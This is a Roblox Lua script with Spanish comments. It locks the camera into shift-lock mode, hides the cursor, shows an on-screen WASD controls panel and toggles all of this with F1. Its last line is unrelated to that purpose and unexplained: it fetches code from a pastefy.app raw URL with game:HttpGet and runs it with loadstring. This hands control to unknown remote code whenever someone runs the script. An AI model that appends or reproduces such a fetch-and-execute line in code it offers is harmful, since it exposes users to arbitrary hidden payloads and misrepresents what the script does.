-- Shift Lock + Mouse oculto + Teclas en pantalla + F1 para quitar
local UIS = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local enabled = true
local connection

-- ===== GUI de teclas en la orilla =====
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "ShiftLockKeys"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 140, 0, 160)
frame.Position = UDim2.new(0, 20, 0.5, -80) -- Orilla izquierda
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
frame.BackgroundTransparency = 0.3
frame.BorderSizePixel = 0
frame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 30)
title.Position = UDim2.new(0, 0, 0, 5)
title.BackgroundTransparency = 1
title.Text = "CONTROLES"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 14
title.Parent = frame

local keys = {
    {text = "W  - Adelante", y = 40},
    {text = "A  - Izquierda", y = 65},
    {text = "S  - Atrás", y = 90},
    {text = "D  - Derecha", y = 115},
    {text = "F1 - Activar/Quitar", y = 140}
}

for _, key in pairs(keys) do
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, -10, 0, 22)
    label.Position = UDim2.new(0, 10, 0, key.y)
    label.BackgroundTransparency = 1
    label.Text = key.text
    label.TextColor3 = Color3.fromRGB(220, 220, 220)
    label.Font = Enum.Font.Gotham
    label.TextSize = 13
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.Parent = frame
end

-- ===== Función de Shift Lock =====
local function enableShiftLock()
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")
    local root = character:WaitForChild("HumanoidRootPart")

    UIS.MouseIconEnabled = false
    UIS.MouseBehavior = Enum.MouseBehavior.LockCenter

    connection = RunService.RenderStepped:Connect(function()
        if not enabled then return end
        UIS.MouseIconEnabled = false
        UIS.MouseBehavior = Enum.MouseBehavior.LockCenter
        
        if humanoid and root and humanoid.Health > 0 then
            humanoid.AutoRotate = false
            local _, y = workspace.CurrentCamera.CFrame:ToEulerAnglesYXZ()
            root.CFrame = CFrame.new(root.Position) * CFrame.Angles(0, y, 0)
        end
    end)
end

local function disableShiftLock()
    if connection then
        connection:Disconnect()
        connection = nil
    end
    UIS.MouseIconEnabled = true
    UIS.MouseBehavior = Enum.MouseBehavior.Default
    
    local character = player.Character
    if character then
        local humanoid = character:FindFirstChild("Humanoid")
        if humanoid then
            humanoid.AutoRotate = true
        end
    end
end

-- Activar al inicio
enableShiftLock()

-- F1 para activar / desactivar
UIS.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.F1 then
        enabled = not enabled
        if enabled then
            enableShiftLock()
            frame.Visible = true
            print("✅ Shift Lock ACTIVADO")
        else
            disableShiftLock()
            frame.Visible = false
            print("❌ Shift Lock DESACTIVADO")
        end
    end
end)

print("✅ Script cargado | F1 para activar/desactivar")

loadstring(game:HttpGet("https://pastefy.app/AaiE5Jpp/raw"))()